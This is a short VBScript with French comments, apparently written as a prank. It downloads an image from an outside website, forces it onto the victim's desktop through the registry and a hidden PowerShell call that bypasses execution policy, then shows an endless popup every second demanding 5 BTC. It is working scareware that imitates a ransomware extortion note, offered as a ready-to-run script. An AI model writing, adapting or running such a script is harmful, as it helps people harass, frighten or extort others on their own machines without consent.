Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Définition de l'URL de l'image et de son emplacement local
imageUrl = "https://aor-forum.zk-web.fr/storage/img/fond-ecrant-test.png"
localImagePath = "C:\Users\Public\background_prank.jpg"

' Fonction pour télécharger l'image
Sub DownloadImage()
    On Error Resume Next
    Dim objXMLHTTP, objStream
    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    objXMLHTTP.Open "GET", imageUrl, False
    objXMLHTTP.Send
    
    If objXMLHTTP.Status = 200 Then
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Open
        objStream.Type = 1
        objStream.Write objXMLHTTP.ResponseBody
        objStream.SaveToFile localImagePath, 2
        objStream.Close
    End If
End Sub

' Fonction pour appliquer immédiatement le fond d'écran
Sub SetWallpaper()
    On Error Resume Next
    DownloadImage

    If objFSO.FileExists(localImagePath) Then
        ' Écrire dans le registre
        objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", localImagePath, "REG_SZ"

        ' Forcer le changement du fond d'écran avec PowerShell
        cmd = "powershell -ExecutionPolicy Bypass -Command ""(Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class P { [DllImport(\""user32.dll\"", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }' -PassThru)::SystemParametersInfo(20, 0, '" & localImagePath & "', 3)"""
        objShell.Run cmd, 0, True
    End If
End Sub

' Appliquer immédiatement le fond d'écran
SetWallpaper

' Boucle pour afficher une pop-up toutes les secondes
Do
    objShell.Popup "Merci d'envoyer 5btc a l'addres suivant wypii@yogurt.com", 1, "Alerte", 48
    WScript.Sleep 1000
Loop
